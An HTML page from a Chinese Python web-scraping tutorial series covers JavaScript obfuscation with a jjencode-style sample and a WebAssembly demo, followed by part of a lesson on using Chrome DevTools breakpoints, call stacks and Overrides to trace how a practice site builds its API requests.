class="variable">$</span><span class="type">.__</span><span class="variable">$</span>])+(<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>=(<span class="variable">$</span>.<span class="variable">$</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">.__</span><span class="variable">$</span>])+((!<span class="variable">$</span>)+<span class="string">""</span>)[<span class="variable">$</span><span class="type">._</span><span class="variable">$</span><span class="variable">$</span>]+(<span class="variable">$</span>.__=<span class="variable">$</span>.<span class="variable">$_</span>[<span class="variable">$</span><span class="type">.</span><span class="variable">$</span><span class="variable">$_</span>])+(<span class="variable">$</span>.<span class="variable">$</span>=(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">.__</span><span class="variable">$</span>])+(<span class="variable">$</span>._=(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">._</span><span class="variable">$_</span>])+<span class="variable">$</span>.<span class="variable">$_</span>[<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span><span class="variable">$</span>]+<span class="variable">$</span>.__+<span class="variable">$</span>._<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span>;<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>=<span class="variable">$</span>.<span class="variable">$</span>+(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">._</span><span class="variable">$</span><span class="variable">$</span>]+<span class="variable">$</span>.__+<span class="variable">$</span>._+<span class="variable">$</span>.<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>;<span class="variable">$</span>.<span class="variable">$</span>=(<span class="variable">$</span>.___)[<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span>][<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span>];<span class="variable">$</span>.<span class="variable">$</span>(<span class="variable">$</span>.<span class="variable">$</span>(<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>+<span class="string">"\"</span><span class="string">"+"</span>\\<span class="string">"+<span class="variable">$</span>.__<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$_</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$_</span>+<span class="variable">$</span>.<span class="variable">$_</span><span class="variable">$_</span>+"</span>\\<span class="string">"+<span class="variable">$</span>.__<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$_</span>+<span class="variable">$</span>._<span class="variable">$_</span>+"</span>\\<span class="string">"+<span class="variable">$</span>.<span class="variable">$__</span>+<span class="variable">$</span>.___+<span class="variable">$</span>.<span class="variable">$_</span><span class="variable">$_</span>+"</span>\\<span class="string">"+<span class="variable">$</span>.<span class="variable">$__</span>+<span class="variable">$</span>.___+"</span>=\\<span class="string">"+<span class="variable">$</span>.<span class="variable">$__</span>+<span class="variable">$</span>.___+<span class="variable">$</span>.__<span class="variable">$</span>+"</span>\<span class="string">""</span>)())();</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，通过这些工具，原本非常简单的代码被转化为一些几乎完全不可读的代码，但实际上运行效果还是相同的。这些混淆方式比较另类，看起来虽然没有什么头绪，但实际上找到规律是非常好还原的，其没有真正达到强力混淆的效果。</p>
                  <p>以上便是对 JavaScript 混淆方式的介绍和总结。总的来说，经过混淆的 JavaScript 代码其可读性大大降低，同时防护效果也大大增强。</p>
                  <h2 id="6-WebAssembly"><a href="#6-WebAssembly" class="headerlink" title="6. WebAssembly"></a>6. WebAssembly</h2>
                  <p>随着技术的发展，WebAssembly 逐渐流行起来。不同于 JavaScript 混淆技术， WebAssembly 其基本思路是将一些核心逻辑使用其他语言（如 C/C++ 语言）来编写，并编译成类似字节码的文件，并通过 JavaScript 调用执行，从而起到二进制级别的防护作用。</p>
                  <p>WebAssembly 是一种可以使用非 JavaScript 编程语言编写代码并且能在浏览器上运行的技术方案，比如借助于我们能将 C/C++ 利用 Emscripten 编译工具转成 wasm 格式的文件， JavaScript 可以直接调用该文件执行其中的方法。</p>
                  <p>WebAssembly 是经过编译器编译之后的字节码，可以从 C/C++ 编译而来，得到的字节码具有和 JavaScript 相同的功能，运行速度更快，体积更小，而且在语法上完全脱离 JavaScript，同时具有沙盒化的执行环境。</p>
                  <p>比如这就是一个基本的 WebAssembly 示例：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">WebAssembly.compile(</span><br><span class="line">  <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(</span><br><span class="line">    <span class="string">`</span></span><br><span class="line"><span class="string">  00 61 73 6d  01 00 00 00  01 0c 02 60  02 7f 7f 01</span></span><br><span class="line"><span class="string">  7f 60 01 7f  01 7f 03 03  02 00 01 07  10 02 03 61</span></span><br><span class="line"><span class="string">  64 64 00 00  06 73 71 75  61 72 65 00  01 0a 13 02</span></span><br><span class="line"><span class="string">  08 00 20 00  20 01 6a 0f  0b 08 00 20  00 20 00 6c</span></span><br><span class="line"><span class="string">  0f 0b`</span></span><br><span class="line">      .trim()</span><br><span class="line">      .split(<span class="regexp">/[\s\r\n]+/g</span>)</span><br><span class="line">      .map(<span class="function">(<span class="params">str</span>) =&gt;</span> <span class="built_in">parseInt</span>(str, <span class="number">16</span>))</span><br><span class="line">  )</span><br><span class="line">).then(<span class="function">(<span class="params"><span class="built_in">module</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> instance = <span class="keyword">new</span> WebAssembly.Instance(<span class="built_in">module</span>);</span><br><span class="line">  <span class="keyword">const</span> &#123; add, square &#125; = instance.exports;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"2 + 4 ="</span>, add(<span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"3^2 ="</span>, square(<span class="number">3</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"(2 + 5)^2 ="</span>, square(add(<span class="number">2</span> + <span class="number">5</span>)));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里其实是利用 WebAssembly 定义了两个方法，分别是 add 和 square，可以分别用于求和和开平方计算。那这两个方法在哪里声明的呢？其实它们被隐藏在了一个 Uint8Array 里面，仅仅查看明文代码我们确实无从知晓里面究竟定义了什么逻辑，但确实是可以执行的，我们将这段代码输入到浏览器控制台下，运行结果如下：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="number">2</span> + <span class="number">4</span> = <span class="number">6</span></span><br><span class="line"><span class="number">3</span>^<span class="number">2</span> = <span class="number">9</span></span><br><span class="line">(<span class="number">2</span> + <span class="number">5</span>)^<span class="number">2</span> = <span class="number">49</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>由此可见，通过 WebAssembly 我们可以成功将核心逻辑“隐藏”起来，这样某些核心逻辑就不能被轻易找出来了。</p>
                  <p>所以，很多网站越来越多使用 WebAssembly 技术来保护一些核心逻辑不被轻易被人识别或破解，可以起到更好的防护效果。</p>
                  <h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2>
                  <p>以上，我们就介绍了接口加密技术和 JavaScript 的压缩、混淆技术，也对 WebAssembly 技术有了初步的了解，知己知彼方能百战不殆，了解了原理，我们才能更好地去实现 JavaScript 的逆向。</p>
                  <p>本节代码：<a href="https://github.com/Python3WebSpider/JavaScriptObfuscate" target="_blank" rel="noopener">https://github.com/Python3WebSpider/JavaScriptObfuscate</a>。</p>
                  <p>由于本节涉及一些专业名词，部分内容参考来源如下：</p>
                  <ul>
                    <li>GitHub - javascript-obfuscator 官方 GitHub 仓库：<a href="https://github.com/javascript-obfuscator/javascript-obfuscator" target="_blank" rel="noopener">https://github.com/javascript-obfuscator/javascript-obfuscator</a></li>
                    <li>官网 - javascript-obfuscator 官网：<a href="https://obfuscator.io/" target="_blank" rel="noopener">https://obfuscator.io/</a></li>
                    <li>博客 - asm.js 和 Emscripten 入门教程：<a href="https://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html</a></li>
                    <li>博客 - JavaScript 混淆安全加固：<a href="https://juejin.im/post/5cfcb9d25188257e853fa71c" target="_blank" rel="noopener">https://juejin.im/post/5cfcb9d25188257e853fa71c</a></li>
                  </ul>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-05 14:11:52" itemprop="dateCreated datePublished" datetime="2022-03-05T14:11:52+08:00">2022-03-05</time>
                </span>
                <span id="/2022111.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - JavaScript 网站加密和混淆技术简介" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>34k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>31 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022112.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022112.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - JavaScript 逆向调试常用技巧</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3 网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>前面一节我们了解了 JavaScript 的压缩、混淆等技术，现在越来越多的网站也已经应用了这些技术对其数据接口进行了保护，在做爬虫时如果我们遇到了这种情况，我们可能就不得不硬着头皮来去想方设法找出其中隐含的关键逻辑了，这个过程我们可以称之为 JavaScript 逆向。</p>
                  <p>既然我们要做 JavaScript 逆向，那少不了要用到浏览器的开发者工具，因为网页是在浏览器中加载的，所以多数的调试过程也是在浏览器中完成的。</p>
                  <p>工欲善其事，必先利其器。本节我们先来基于 Chrome 浏览器介绍一下浏览器开发者工具的使用。但由于开发者工具功能十分复杂，本节主要介绍对 JavaScript 逆向有一些帮助的功能，学会了这些，我们在做 JavaScript 逆向调试的过程会更加得心应手。</p>
                  <p>本节我们以一个示例网站 <a href="https://spa2.scrape.center/" target="_blank" rel="noopener">https://spa2.scrape.center/</a> 来做演示，用这个示例来介绍浏览器开发者工具各个面版的用法。</p>
                  <h2 id="1-面板介绍"><a href="#1-面板介绍" class="headerlink" title="1. 面板介绍"></a>1. 面板介绍</h2>
                  <p>首先我们用 Chrome 浏览器打开示例网站，页面如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/tc2si.png" alt="示例网站页面"></p>
                  <p>接下来打开开发者工具，我们会看到类似图 xx 所示的结果。</p>
                  <p><img src="https://cdn.cuiqingcai.com/q32zi.png" alt="打开开发者工具"></p>
                  <p>这里可以看到多个面板标签，如 Elements、Console、Sources 等，这就是开发者工具的一个个面板，功能丰富而又强大，先对面板作下简单的介绍：</p>
                  <ul>
                    <li>Elements：元素面板，用于查看或修改当前网页 HTML 节点的属性、CSS 属性、监听事件等等，HTML 和 CSS 都可以即时修改和即时显示。</li>
                    <li>Console：控制台面板，用于查看调试日志或异常信息。另外我们还可以在控制台输入 JavaScript 代码，方便调试。</li>
                    <li>Sources：源代码面板，用于查看页面的 HTML 文件源代码、JavaScript 源代码、CSS 源代码，还可以在此面板对 JavaScript 代码进行调试，比如添加和修改 JavaScript 断点，观察 JavaScript 变量变化等。</li>
                    <li>Network：网络面板，用于查看页面加载过程中的各个网络请求，包括请求、响应等各个详情。</li>
                    <li>Performance：性能面板，用于记录和分析页面在运行时的所有活动，比如 CPU 占用情况，呈现页面性能分析结果，</li>
                    <li>Memory：内存面板，用于记录和分析页面占用内存情况，如查看内存占用变化，查看 JavaScript 对象和 HTML 节点的内存分配。</li>
                    <li>Application：应用面板，用于记录网站加载的所有资源信息，如存储、缓存、字体、图片等，同时也可以对一些资源进行修改和删除。</li>
                    <li>Lighthouse：审核面板，用于分析网络应用和网页，收集现代性能指标并提供对开发人员最佳实践的意见。</li>
                  </ul>
                  <p>了解了这些面板之后，我们来深入了解几个面板中对 JavaScript 调试很有帮助的功能。</p>
                  <h2 id="2-查看节点事件"><a href="#2-查看节点事件" class="headerlink" title="2. 查看节点事件"></a>2. 查看节点事件</h2>
                  <p>之前我们是用 Elements 面板来审查页面的节点信息的，我们可以查看当前页面的 HTML 源代码及其在网页中对应的位置，查看某个条目的标题对应的页面源代码，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/oigc0.png" alt="查看源代码"></p>
                  <p>点击右侧的 Styles 选项卡，可以看到对应节点的 CSS 样式，我们可以自行在这里增删样式，实时预览效果，这对网页开发十分有帮助。</p>
                  <p>在 Computed 选项卡中还可以看到当前节点的盒子模型，比如外边距、内边距等，还可以看到当前节点最终计算出的 CSS 的样式，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/9uo6h.png" alt="盒子模型"></p>
                  <p>接下来切换到右侧的 Event Listeners 选项卡，这里可以显示各个节点当前已经绑定的事件，都是 JavaScript 原生支持的，下面简单列举几个事件。</p>
                  <ul>
                    <li><code>change</code>：HTML 元素改变时会触发的事件。</li>
                    <li><code>click</code>：用户点击 HTML 元素时会触发的事件。</li>
                    <li><code>mouseover</code>：用户在一个 HTML 元素上移动鼠标会触发的事件。</li>
                    <li><code>mouseout</code>：用户从一个 HTML 元素上移开鼠标会触发的事件。</li>
                    <li><code>keydown</code>：用户按下键盘按键会触发的事件。</li>
                    <li><code>load</code>：浏览器完成页面加载时会触发的事件。</li>
                  </ul>
                  <p>通常，我们会给按钮绑定一个点击事件，它的处理逻辑一般是由 JavaScript 定义的，这样在我们点击按钮的时候，对应的 JavaScript 代码便会执行。比如在图 xx 中，我们选中切换到第 2 页的节点，右侧 Event Listeners 选项卡下会看到它绑定的事件。</p>
                  <p><img src="https://cdn.cuiqingcai.com/068my.png" alt="选中切换到第 2 页的节点"></p>
                  <p>这里有对应事件的代码位置，内容为一个 JavaScript 文件名称 <code>chunk-vendors.77daf991.js</code>，然后紧跟一个冒号，然后再跟了一个数字 7。所以对应的事件处理函数是定义在 <code>chunk-vendors.77daf991.js</code> 这个文件的第 7 行。点击这个代码位置，便会自动跳转 Sources 面板，打开对应的 <code>chunk-vendors.77daf991.js</code> 文件并跳转到对应的位置，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/s26fz.png" alt="跳转到对应的代码位置"></p>
                  <p>所以，利用好 Event Listeners，我们可以轻松地找到各个节点绑定事件的处理方法所在的位置，帮我们在 JavaScript 逆向过程中找到一些突破口。</p>
                  <h2 id="3-代码美化"><a href="#3-代码美化" class="headerlink" title="3. 代码美化"></a>3. 代码美化</h2>
                  <p>刚才我们已经通过 Event Listeners 找到了对应的事件处理方法所在的位置并成功跳转到了代码所在的位置。</p>
                  <p>但是，这部分代码似乎被压缩过了，可读性很差，根本没法阅读，这时候应该怎么办呢？</p>
                  <p>不用担心，Sources 面板提供了一个便捷好用的代码美化功能。我们点击代码面板左下角的格式化按钮，代码就会变成如图所示的样子。</p>
                  <p><img src="https://cdn.cuiqingcai.com/92ouc.png" alt="代码格式化按钮"></p>
                  <p><img src="https://cdn.cuiqingcai.com/da7lc.png" alt="格式化后的代码"></p>
                  <p>此时会新出现一个叫作 <code>chunk-vendors.77daf991.js:formatted</code> 的选项卡，文件名后面加了 formatted 标识，代表这是被格式化的结果。我们会发现，原来代码在第 7 行，现在自动对应到了第 4445 行，而且对应的代码位置会高亮显示，代码可读性大大增强！</p>
                  <p>这个功能在调试过程中非常常用，用好这个功能会给我们的 JavaScript 调试过程带来极大的便利。</p>
                  <h2 id="4-断点调试"><a href="#4-断点调试" class="headerlink" title="4. 断点调试"></a>4. 断点调试</h2>
                  <p>接下来介绍一个非常重要的功能——断点调试。在调试代码的时候，我们可以在需要的位置上打断点，当对应事件触发时，浏览器就会自动停在断点的位置等待调试，此时我们可以选择单步调试，在面板中观察调用栈、变量值，以更好地追踪对应位置的执行逻辑。</p>
                  <p>那么断点怎么打呢？我们接着以上面的例子来说。首先单击如图所示的代码行号。</p>
                  <p><img src="https://cdn.cuiqingcai.com/ynj3a.png" alt="单击代码行号"></p>
                  <p>这时候行号处就出现了一个蓝色的箭头，这就证明断点已经添加好了，同时在右侧的 Breakpoints 选项卡下会出现我们添加的断点的列表。</p>
                  <p>由于我们知道这个断点是用来处理翻页按钮的点击事件的，所以可以在网页里面点击按钮试一下，比如点击第 2 页的按钮，这时候就会发现断点被触发了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/sx6uu.png" alt="断点被触发"></p>
                  <p>这时候我们可以看到页面中显示了一个叫作 <code>Paused in debugger</code> 的提示，这说明浏览器执行到刚才我们设置断点的位置处就不再继续执行了，等待我们发号施令执行调试。</p>
                  <p>此时代码停在了第 4446 行，回调参数 <code>e</code> 就是对应的点击事件 <code>MouseEvent</code> 。在右侧的 Scope 面板处，可以观察到各个变量的值，比如在 <code>Local</code> 域下有当前方法的局部变量，我们可以在这里看到 <code>MouseEvent</code> 的各个属性，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/wtc7z.png" alt="查看 Local 域"></p>
                  <p>另外我们关注到有一个方法 <code>o</code>，它在 <code>Jr</code> 方法下面，所以切换到 <code>Closure(Jr)</code> 域可以查看它的定义及其接收的参数，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/eahmg.png" alt="查看 Closure(Jr) 域"></p>
                  <p>我们可以看到，<code>FunctionLocation</code> 又指向了方法 <code>o</code> ，点击之后便又可以跳到指定位置，用同样的方式进行断点调试即可。</p>
                  <p>在 Scope 面板还有多个域，这里就不再展开介绍了。总之，通过 Scope 面板，我们可以看到当前执行环境下的变量的值和方法的定义，知道当前代码究竟执行了怎样的逻辑。</p>
                  <p>接下来切换到 Watch 面板，在这里可以自行添加想要查看的变量和方法，点击右上角的 + 号按钮，我们可以任意添加想要监听的对象，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/qb3kr.png" alt="Watch 面板"></p>
                  <p>比如这里我们比较关注 <code>o.apply</code> 是一个怎样的方法，于是点击添加 <code>o.apply</code>，这里就会把对应的方法定义呈现出来，展开之后可以再点击 <code>FunctionLocation</code> 定位其源码位置。</p>
                  <p>我们还可以切换到 Console 面板，输入任意的 JavaScript 代码，便会执行、输出对应的结果，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/nwxwl.png" alt="Console 面板"></p>
                  <p>如果我们想看看变量 <code>arguments</code> 的第一个元素是什么，那么可以直接敲入 <code>arguments[0]</code>，便会输出对应的结果 <code>MouseEvent</code>，只要在当前上下文能访问到的变量都可以直接引用并输出。</p>
                  <p>此时我们还可以选择单步调试，这里有 3 个重要的按钮，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/564d1.png" alt="单步调试按钮"></p>
                  <p>这 3 个按钮都可以做单步调试，但功能不同。</p>
                  <ul>
                    <li>Step Over Next Function Call：逐语句执行</li>
                    <li>Step Into Next Function Call：进入方法内部执行</li>
                    <li>Step Out of Current Function：跳出当前方法</li>
                  </ul>
                  <p>用得较多的是第一个，相当于逐行调试，比如点击 Step Over Next Function Call 这个按钮，就运行到了 4447 行，高亮的位置就变成了这一行，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/8vzzb.png" alt="点击 Step Over Next Function Call 按钮"></p>
                  <h2 id="5-观察调用栈"><a href="#5-观察调用栈" class="headerlink" title="5. 观察调用栈"></a>5. 观察调用栈</h2>
                  <p>在调试的过程中，我们可能会跳到一个新的位置，比如点击上述 Step Over Next Function Call 几下，可能会跳到一个叫作 <code>ct</code> 的方法中，这时候我们也不知道发生了什么，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/1646k.png" alt="跳到 ct 方法中"></p>
                  <p>那究竟是怎么跳过来的呢？我们可以观察一下右侧的 Call Stack 面板，就可以看到全部的调用过程了。比如它的上一步是 <code>ot</code> 方法，再上一步是 <code>pt</code> 方法，点击对应的位置也可以跳转到对应的代码位置，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/y49p1.png" alt="Call Stack 面板"></p>
                  <p>有时候调用栈是非常有用的，利用它我们可以回溯某个逻辑的执行流程，从而快速找到突破口。</p>
                  <h2 id="6-恢复-JavaScript-执行"><a href="#6-恢复-JavaScript-执行" class="headerlink" title="6. 恢复 JavaScript 执行"></a>6. 恢复 JavaScript 执行</h2>
                  <p>在调试过程中，如果想快速跳到下一个断点或者让 JavaScript 代码运行下去，可以点击 Resume script execution 按钮，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/5hdph.png" alt="Resume script execution 按钮"></p>
                  <p>这时浏览器会直接执行到下一个断点的位置，从而避免陷入无穷无尽的调试中。</p>
                  <p>当然，如果没有其他断点了，浏览器就会恢复正常状态。比如这里我们就没有再设置其他断点了，浏览器直接运行并加载了下一页的数据，同时页面恢复正常，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/k14kv.png" alt="浏览器恢复正常状态"></p>
                  <h2 id="7-Ajax-断点"><a href="#7-Ajax-断点" class="headerlink" title="7. Ajax 断点"></a>7. Ajax 断点</h2>
                  <p>上面我们介绍了一些 DOM 节点的 Listener，通过 Listener 我们可以手动设置断点并进行调试。但其实针对这个例子，通过翻页的点击事件 Listener 是不太容易找到突破口的。</p>
                  <p>接下来我们再介绍一个方法—— Ajax 断点，它可以在发生 Ajax 请求的时候触发断点。对于这个例子，我们的目标其实就是找到 Ajax 请求的那一部分逻辑，找出加密参数是怎么构造的。可以想到，通过 Ajax 断点，使页面在获取数据的时候停下来，我们就可以顺着找到构造 Ajax 请求的逻辑了。</p>
                  <p>怎么设置呢？</p>
                  <p>我们把之前的断点全部取消，切换到 Sources 面板下，然后展开 XHR/fetch Breakpoints，这里就可以设置 Ajax 断点，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/0fkn8.png" alt="展开 XHR/fetch Breakpoints"></p>
                  <p>要设置断点，就要先观察 Ajax 请求。和之前一样，我们点击翻页按钮 2，在 Network 面板里面观察 Ajax 请求是怎样的，请求的 URL 如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/k6gk9.png" alt="请求的 URL"></p>
                  <p>可以看到 URL 里面包含 <code>/api/movie</code> 这样的内容，所以我们可以在刚才的 XHR/fetch Breakpoints 面板中添加拦截规则。点击 + 号，可以看到一行 <code>Break when URL contains:</code> 的提示，意思是当 Ajax 请求的 URL 包含填写的内容时，会进入断点停止，这里可以填写 <code>/api/movie</code>，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/6fv4d.png" alt=""></p>
                  <p>这时候我们再点击翻页按钮 3，触发第 3 页的 Ajax 请求。会发现点击之后页面走到断点停下来了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/87p3k.png" alt="断点调试模式"></p>
                  <p>格式化代码看一下，发现它停到了 Ajax 最后发送的那个时候，即底层的 <code>XMLHttpRequest</code> 的 <code>send</code> 方法，可是似乎还是找不到 Ajax 请求是怎么构造的。前面我们讲过调用栈 Call Stack，通过调用栈是可以顺着找到前序调用逻辑的，所以顺着调用栈一层层找，也可以找到构造 Ajax 请求的逻辑，最后会找到一个叫作 <code>onFetchData</code> 的方法，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/g5oyy.png" alt="找到 onFetchData 方法"></p>
                  <p>接下来切换到 <code>onFetchData</code> 方法并将代码格式化，可以看到如图所示的调用方法。</p>
                  <p><img src="https://cdn.cuiqingcai.com/m86ld.png" alt="调用方法"></p>
                  <p>可以发现，可能使用了 <code>axios</code> 库发起了一个 Ajax 请求，还有 <code>limit</code>、<code>offset</code>、<code>token</code> 这 3 个参数，基本就能确定了，顺利找到了突破口！我们就不在此展开分析了，后文会有完整的分析实战。</p>
                  <p>因此在某些情况下，我们可以在比较容易地通过 Ajax 断点找到分析的突破口，这是一个常见的寻找 JavaScript 逆向突破口的方法。</p>
                  <p>要取消断点也很简单，只需要在 XHR/fetch Breakpoints 面板取消勾选即可，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/rtskp.png" alt="取消断点"></p>
                  <h2 id="8-改写-JavaScript-文件"><a href="#8-改写-JavaScript-文件" class="headerlink" title="8. 改写 JavaScript 文件"></a>8. 改写 JavaScript 文件</h2>
                  <p>我们知道，一个网页里面的 JavaScript 是从对应服务器上下载下来并在浏览器执行的。有时候，我们可能想要在调试的过程中对 JavaScript 做一些更改，比如说有以下需求：</p>
                  <ul>
                    <li>
                      <p>发现 JavaScript 文件中包含很多阻挠调试的代码或者无效代码、干扰代码，想要将其删除。</p>
                    </li>
                    <li>
                      <p>调试到某处，想要加一行 <code>console.log</code> 输出一些内容，以便观察某个变量或方法在页面加载过程中的调用情况。在某些情况下，这种方法比打断点调试更方便。</p>
                    </li>
                    <li>
                      <p>调试过程遇到某个局部变量或方法，想要把它赋值给 <code>window</code> 对象以便全局可以访问或调用。</p>
                    </li>
                    <li>
                      <p>在调试的时候，得到的某个变量中可能包含一些关键的结果，想要加一些逻辑将这些结果转发到对应的目标服务器。</p>
                    </li>
                  </ul>
                  <p>这时候我们可以试着在 Sources 面板中对 JavaScript 进行更改，但这种更改并不能长久生效，一旦刷新页面，更改就全都没有了。比如我们在 JavaScript 文件中写入一行 JavaScript 代码，然后保存，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/p00th.png" alt="在 JavaScript 文件中写入一行 JavaScript 代码"></p>
                  <p>这时候可以发现 JavaScript 文件上出现了一个感叹号标志，提示我们做的更改是不会保存的。这时候重新刷新页面，再看一下更改的这个文件，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/c9u43.png" alt="刷新页面后的 JavaScript 文件"></p>
                  <p>有什么方法可以修改呢？其实有一些浏览器插件可以实现，比如 ReRes。在插件中，我们可以添加自定义的 JavaScript 文件，并配置 URL 映射规则，这样浏览器在加载某个在线 JavaScript 文件的时候就可以将内容替换成自定义的 JavaScript 文件了。另外，还有一些代理服务器也可以实现，比如 Charles、Fiddler，借助它们可以在加载 JavaScript 文件时修改对应 URL 的响应内容，以实现对 JavaScript 文件的修改。</p>
                  <p>其实浏览器的开发者工具已经原生支持这个功能了，即浏览器的 Overrides 功能，它在 Sources 面板左侧，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/vfz28.png" alt="Overrides 功能"></p>
                  <p>我们可以在 Overrides 面板上选定一个本地的文件夹，用于保存需要更改的 JavaScript 文件，我们来实际操作一下。</p>
                  <p>首先，根据上文设置 Ajax 断点的方法，找到对应的构造 Ajax 请求的位置，根据一些网页开发知识，我们可以大体判断出 <code>then</code> 后面的回调方法接收的参数 <code>a</code> 中就包含了 Ajax 请求的结果，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/1nbk1.png" alt=""></p>
                  <p>我们打算在 Ajax 请求成功获得 Response 的时候，在控制台输出 Response 的结果，也就是通过 <code>console.log</code> 输出变量 <code>a</code>。</p>
